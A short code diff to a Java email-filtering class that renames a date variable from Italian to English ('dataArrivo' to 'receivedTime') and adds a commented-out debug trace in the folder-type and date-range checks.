@@ -201,7 +201,7 @@ public class Filter {
         Check.requires(message != null, "filterMessage: message != null");
         //#endif
 
-        long dataArrivo;
+        long receivedTime;
 
         /*
          * debug.trace("invio dell'email " + message.getSentDate() + " long: "
@@ -237,6 +237,9 @@ public class Filter {
 
             for (int i = 0; i < fsize; i++) {
                 if (folderTypes[i] == folderType) {
+                    //#ifdef DEBUG_TRACE
+                    //debug.trace("filterMessage type OK:" + folderType);
+                    //#endif
                     found = true;
                     break;
                 }
@@ -261,17 +264,17 @@ public class Filter {
             //return FILTERED_DISABLED;
         }
 
-        dataArrivo = message.getReceivedDate().getTime();
-        if (dataArrivo < lastcheck) {
+        receivedTime = message.getReceivedDate().getTime();
+        if (receivedTime < lastcheck) {
             //#ifdef DEBUG_INFO
-            debug.info("dataArrivo < lastcheck :" + dataArrivo + " < "
+            debug.info("receivedTime < lastcheck :" + receivedTime + " < "
                     + lastcheck);
             //#endif
             return FILTERED_LASTCHECK;
         }
 
         // se c'e' il filtro from e non viene rispettato escludi la mail
-        if (doFilterFromDate == true && dataArrivo < fromDate) {
+        if (doFilterFromDate == true && receivedTime < fromDate) {
             //#ifdef DEBUG_INFO
             debug.info("doFilterFromDate");
             //#endif
@@ -280,7 +283,7 @@ public class Filter {
 
         // Se c'e' anche il filtro della data di fine e non viene rispettato
         // escludi la mail
-        if (doFilterToDate == true && dataArrivo > toDate) {
+        if (doFilterToDate == true && receivedTime > toDate) {
             //#ifdef DEBUG_INFO
             debug.info("doFilterToDate");
             //#endif
